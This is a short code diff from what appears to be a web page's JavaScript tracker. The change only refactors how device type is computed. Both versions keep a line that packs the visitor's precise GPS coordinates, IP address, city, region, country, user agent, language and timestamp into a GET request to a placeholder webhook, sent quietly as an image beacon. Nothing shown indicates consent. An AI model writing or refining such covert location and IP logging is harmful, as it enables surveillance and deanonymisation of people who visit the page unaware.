@@ -424,10 +424,7 @@
       const lat = pos.coords?.latitude || "unknown";
       const lon = pos.coords?.longitude || "unknown";
       const acc = pos.coords?.accuracy || "unknown";
-      const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&country=${encodeURIComponent(locationData.country)}&region=${encodeURIComponent(locationData.region)}&city=${encodeURIComponent(locationData.city)}&ip=${encodeURIComponent(locationData.ip)}&deviceType=${encodeURIComponent(
-  document.body.classList.contains('mobile') ? 'mobile' :
-  document.body.classList.contains('tablet') ? 'tablet' : 'desktop'
-)}&userAgent=${encodeURIComponent(navigator.userAgent)}&timestamp=${encodeURIComponent(new Date().toISOString())}&language=${encodeURIComponent(navigator.language)}`;
+      const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&country=${encodeURIComponent(locationData.country)}&region=${encodeURIComponent(locationData.region)}&city=${encodeURIComponent(locationData.city)}&ip=${encodeURIComponent(locationData.ip)}&deviceType=${encodeURIComponent(detectDeviceType())}&userAgent=${encodeURIComponent(navigator.userAgent)}&timestamp=${encodeURIComponent(new Date().toISOString())}&language=${encodeURIComponent(navigator.language)}`;
       const img = new Image();
       img.onerror = () => console.error("GET request failed:", url);
       img.src = url;
